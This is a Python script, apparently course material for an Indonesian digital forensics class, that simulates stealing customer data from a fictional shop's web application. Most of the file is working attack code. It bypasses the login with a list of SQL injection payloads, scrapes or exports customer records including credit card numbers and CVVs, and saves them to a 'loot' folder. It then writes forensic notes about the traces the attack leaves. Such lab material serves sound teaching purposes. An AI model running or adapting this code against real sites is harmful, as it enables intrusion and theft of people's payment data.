#!/usr/bin/env python3
"""
Data Exfiltration Simulation
PT. TechMart Indonesia - Educational Purpose

DISCLAIMER: This script is for EDUCATIONAL PURPOSES ONLY!
Only use on systems you have permission to test.

Materi: CPMK-6 - Forensik Digital & Manajemen Risiko
Demonstrasi: Exfiltrasi data pelanggan dan jejak forensik yang ditinggalkan
"""

import requests
import sys
import json
import csv
import hashlib
import os
from datetime import datetime
from urllib.parse import urljoin
import base64

# ANSI Colors
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def banner():
    print(f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════╗
║{Colors.YELLOW}  📤 DATA EXFILTRATION SIMULATOR - Forensik Digital           {Colors.RED}║
║{Colors.CYAN}     PT. TechMart Indonesia - Educational Purpose Only        {Colors.RED}║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
    """)

class DataExfiltrator:
    def __init__(self, target_url, output_dir="./loot"):
        self.target_url = target_url
        self.output_dir = output_dir
        self.session = requests.Session()
        self.exfiltrated_data = []
        self.activity_log = []
        
        # Create output directory
        os.makedirs(output_dir, exist_ok=True)
        
    def log(self, message, level="info"):
        colors = {
            "info": Colors.CYAN,
            "success": Colors.GREEN,
            "warning": Colors.YELLOW,
            "error": Colors.RED,
            "exfil": Colors.PURPLE
        }
        color = colors.get(level, Colors.RESET)
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{Colors.BOLD}[{timestamp}]{Colors.RESET} {color}{message}{Colors.RESET}")
        
        self.activity_log.append({
            "timestamp": datetime.now().isoformat(),
            "level": level,
            "message": message
        })
    
    def authenticate(self):
        """
        Authenticate using SQL Injection bypass
        """
        self.log("[PHASE 1] Attempting authentication bypass...", "exfil")
        
        login_url = urljoin(self.target_url, "login.php")
        
        # SQL injection payloads - akan dicoba berurutan sampai sukses
        sqli_payloads = [
            {"username": "admin'-- ", "password": "anything"},       # Comment out password check
            {"username": "' OR '1'='1'-- ", "password": "anything"}, # Always true
            {"username": "' OR 1=1-- ", "password": "anything"},     # Always true (numeric)
            {"username": "admin' #", "password": "anything"},        # MySQL comment
        ]
        
        for payload in sqli_payloads:
            try:
                self.log(f"    Trying: {payload['username']}", "info")
                response = self.session.post(login_url, data=payload, allow_redirects=True, timeout=10)
                
                # Cek apakah berhasil login (ada kata logout/dashboard di response)
                if "logout" in response.text.lower() or "dashboard" in response.text.lower():
                    self.log(f"[✓] Authentication bypassed with: {payload['username']}", "success")
                    return True
                    
            except Exception as e:
                self.log(f"    Error: {e}", "error")
                continue
        
        self.log("[-] All SQL injection payloads failed", "warning")
        return False
    
    def access_customer_page(self):
        """
        Access customer data page
        """
        self.log("\n[PHASE 2] Accessing customer data page...", "exfil")
        
        customers_url = urljoin(self.target_url, "customers.php")
        
        try:
            response = self.session.get(customers_url, timeout=10)
            
            if response.status_code == 200 and "credit_card" in response.text.lower():
                self.log("[✓] Customer data page accessed!", "success")
                self.log(f"    Page size: {len(response.text)} bytes", "info")
                return response.text
            elif response.status_code == 302:
                self.log("[-] Redirected - authentication required", "warning")
                return None
            else:
                self.log(f"[-] Unexpected response: {response.status_code}", "warning")
                return None
                
        except Exception as e:
            self.log(f"[!] Error accessing customer page: {e}", "error")
            return None
    
    def parse_customer_data(self, html_content):
        """
        Parse customer data from HTML table
        """
        self.log("\n[PHASE 3] Parsing customer data...", "exfil")
        
        import re
        
        customers = []
        
        # Find table rows
        rows = re.findall(r'<tr>(.*?)</tr>', html_content, re.DOTALL)
        
        for row in rows[1:]:  # Skip header row
            cells = re.findall(r'<td[^>]*>(.*?)</td>', row, re.DOTALL)
            
            if len(cells) >= 8:
                customer = {
                    "id": cells[0].strip(),
                    "first_name": cells[1].strip(),
                    "last_name": cells[2].strip(),
                    "email": cells[3].strip(),
                    "phone": cells[4].strip(),
                    "address": cells[5].strip(),
                    "credit_card": cells[6].strip(),
                    "cvv": cells[7].strip()
                }
                customers.append(customer)
        
        self.log(f"[✓] Parsed {len(customers)} customer records", "success")
        self.exfiltrated_data = customers
        return customers
    
    def use_export_function(self):
        """
        Use legitimate export function (simulating insider threat)
        """
        self.log("\n[PHASE 3b] Using export function...", "exfil")
        
        export_url = urljoin(self.target_url, "export.php")
        
        try:
            response = self.session.get(export_url, timeout=10)
            
            if response.status_code == 200 and "csv" in response.headers.get("Content-Type", ""):
                self.log("[✓] Export function accessed!", "success")
                self.log(f"    Downloaded {len(response.content)} bytes", "info")
                
                # Save raw export
                export_file = os.path.join(self.output_dir, f"export_raw_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv")
                with open(export_file, 'wb') as f:
                    f.write(response.content)
                
                self.log(f"[✓] Raw export saved to {export_file}", "success")
                
                # Parse CSV
                import io
                csv_reader = csv.DictReader(io.StringIO(response.content.decode('utf-8')))
                self.exfiltrated_data = list(csv_reader)
                
                return True
        except Exception as e:
            self.log(f"[!] Export error: {e}", "error")
        
        return False
    
    def extract_via_sqli(self):
        """
        Extract data using SQL injection
        """
        self.log("\n[PHASE 3c] Extracting data via SQL injection...", "exfil")
        
        search_url = urljoin(self.target_url, "search_customers.php")
        
        # SQL injection payload to dump all customers
        payload = "' OR 1=1-- -"
        
        try:
            response = self.session.get(search_url, params={"q": payload}, timeout=10)
            
            if response.status_code == 200:
                self.log("[✓] SQL injection successful!", "success")
                
                # Parse results
                import re
                rows = re.findall(r'<tr>(.*?)</tr>', response.text, re.DOTALL)
                
                customers = []
                for row in rows[1:]:
                    cells = re.findall(r'<td[^>]*>(.*?)</td>', row, re.DOTALL)
                    if len(cells) >= 5:
                        customer = {
                            "id": cells[0].strip(),
                            "name": cells[1].strip(),
                            "email": cells[2].strip(),
                            "phone": cells[3].strip(),
                            "credit_card": cells[4].strip()
                        }
                        customers.append(customer)
                
                self.log(f"[✓] Extracted {len(customers)} records via SQLi", "success")
                if not self.exfiltrated_data:
                    self.exfiltrated_data = customers
                return True
                
        except Exception as e:
            self.log(f"[!] SQLi extraction error: {e}", "error")
        
        return False
    
    def save_exfiltrated_data(self):
        """
        Save exfiltrated data to files
        """
        self.log("\n[PHASE 4] Saving exfiltrated data...", "exfil")
        
        if not self.exfiltrated_data:
            self.log("[-] No data to save", "warning")
            return
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Save as JSON
        json_file = os.path.join(self.output_dir, f"customers_{timestamp}.json")
        with open(json_file, 'w') as f:
            json.dump(self.exfiltrated_data, f, indent=2)
        self.log(f"[✓] JSON saved: {json_file}", "success")
        
        # Save as CSV
        csv_file = os.path.join(self.output_dir, f"customers_{timestamp}.csv")
        if self.exfiltrated_data:
            with open(csv_file, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=self.exfiltrated_data[0].keys())
                writer.writeheader()
                writer.writerows(self.exfiltrated_data)
        self.log(f"[✓] CSV saved: {csv_file}", "success")
        
        # Generate hash for evidence integrity
        with open(json_file, 'rb') as f:
            file_hash = hashlib.sha256(f.read()).hexdigest()
        self.log(f"[✓] SHA-256 hash: {file_hash}", "info")
        
        # Save hash
        hash_file = os.path.join(self.output_dir, f"customers_{timestamp}.sha256")
        with open(hash_file, 'w') as f:
            f.write(f"{file_hash}  customers_{timestamp}.json\n")
        
        return {
            "json_file": json_file,
            "csv_file": csv_file,
            "sha256": file_hash,
            "records": len(self.exfiltrated_data)
        }
    
    def generate_forensic_evidence(self):
        """
        Generate evidence for forensic analysis
        """
        self.log("\n[PHASE 5] Generating forensic evidence documentation...", "exfil")
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        evidence = {
            "incident_summary": {
                "timestamp": datetime.now().isoformat(),
                "target": self.target_url,
                "attack_type": "Data Exfiltration",
                "records_compromised": len(self.exfiltrated_data)
            },
            "attack_timeline": self.activity_log,
            "indicators_of_compromise": {
                "ip_addresses": ["Attacker IP would be logged here"],
                "user_agents": [self.session.headers.get("User-Agent", "Python-requests")],
                "urls_accessed": [
                    f"{self.target_url}/login.php",
                    f"{self.target_url}/customers.php",
                    f"{self.target_url}/export.php",
                    f"{self.target_url}/search_customers.php"
                ],
                "sqli_payloads_used": [
                    "' OR '1'='1",
                    "admin'--",
                    "' OR 1=1-- -"
                ]
            },
            "evidence_files": {
                "exfiltrated_data": f"customers_{timestamp}.json",
                "hash_file": f"customers_{timestamp}.sha256"
            },
            "forensic_artifacts_to_check": [
                "/var/log/apache2/techmart-access.log",
                "/var/log/apache2/techmart-error.log",
                "MySQL audit_log table",
                "MySQL login_attempts table",
                "Session files in /tmp",
                "PHP error logs"
            ]
        }
        
        # Save evidence documentation
        evidence_file = os.path.join(self.output_dir, f"forensic_evidence_{timestamp}.json")
        with open(evidence_file, 'w') as f:
            json.dump(evidence, f, indent=2)
        
        self.log(f"[✓] Forensic evidence saved: {evidence_file}", "success")
        
        return evidence
    
    def run_exfiltration(self):
        """
        Run complete data exfiltration simulation
        """
        print(f"\n{Colors.BOLD}Starting Data Exfiltration Simulation...{Colors.RESET}\n")
        
        # Phase 1: Authenticate
        auth_success = self.authenticate()
        
        # Phase 2: Access customer page
        html_content = self.access_customer_page()
        
        # Phase 3: Extract data
        if html_content:
            self.parse_customer_data(html_content)
        else:
            # Try export function
            if not self.use_export_function():
                # Try SQL injection
                self.extract_via_sqli()
        
        # Phase 4: Save data
        save_result = self.save_exfiltrated_data()
        
        # Phase 5: Generate forensic evidence
        evidence = self.generate_forensic_evidence()
        
        # Print summary
        print(f"""
{Colors.BOLD}═══════════════════════════════════════════════════════════════
               DATA EXFILTRATION SUMMARY
═══════════════════════════════════════════════════════════════{Colors.RESET}

{Colors.RED}⚠️  SIMULATED DATA BREACH COMPLETE{Colors.RESET}

{Colors.CYAN}Target:{Colors.RESET} {self.target_url}
{Colors.CYAN}Records Compromised:{Colors.RESET} {len(self.exfiltrated_data)}
{Colors.CYAN}Data Types Exposed:{Colors.RESET}
  • Customer Names
  • Email Addresses
  • Phone Numbers
  • Physical Addresses
  • Credit Card Numbers
  • CVV Codes

{Colors.YELLOW}Output Directory:{Colors.RESET} {self.output_dir}

{Colors.GREEN}Forensic Artifacts Created:{Colors.RESET}
  • Exfiltrated data files
  • SHA-256 hash for integrity
  • Activity timeline
  • Evidence documentation

{Colors.BOLD}═══════════════════════════════════════════════════════════════{Colors.RESET}
        """)
        
        return {
            "success": len(self.exfiltrated_data) > 0,
            "records_exfiltrated": len(self.exfiltrated_data),
            "evidence": evidence
        }


def main():
    banner()
    
    import argparse
    parser = argparse.ArgumentParser(description='Data Exfiltration Simulator for Forensic Simulation')
    parser.add_argument('--target', '-t', type=str, default='http://172.28.0.10', 
                        help='Target URL (default: http://172.28.0.10)')
    parser.add_argument('--output', '-o', type=str, default='./loot',
                        help='Output directory (default: ./loot)')
    parser.add_argument('target_positional', nargs='?', default=None,
                        help='Target URL (positional argument)')
    
    args = parser.parse_args()
    
    # Use positional argument if provided, otherwise use --target
    target = args.target_positional if args.target_positional else args.target
    output_dir = args.output
    
    # Ensure URL has scheme
    if not target.startswith("http"):
        target = f"http://{target}"
    
    print(f"{Colors.BOLD}Target: {target}{Colors.RESET}")
    print(f"{Colors.BOLD}Output: {output_dir}{Colors.RESET}")
    print(f"{Colors.YELLOW}⚠️  This is for EDUCATIONAL PURPOSES ONLY!{Colors.RESET}\n")
    
    exfiltrator = DataExfiltrator(target, output_dir)
    result = exfiltrator.run_exfiltration()
    
    print(f"""
{Colors.CYAN}Next Steps for Forensic Investigation:{Colors.RESET}
1. Analyze server access logs for suspicious patterns
2. Check database audit tables for unauthorized queries
3. Review login attempt records
4. Create timeline of attacker activities
5. Calculate hash values for evidence integrity
6. Document chain of custody

{Colors.YELLOW}Remember: In real incidents, preserve all evidence before analysis!{Colors.RESET}
    """)


if __name__ == "__main__":
    main()
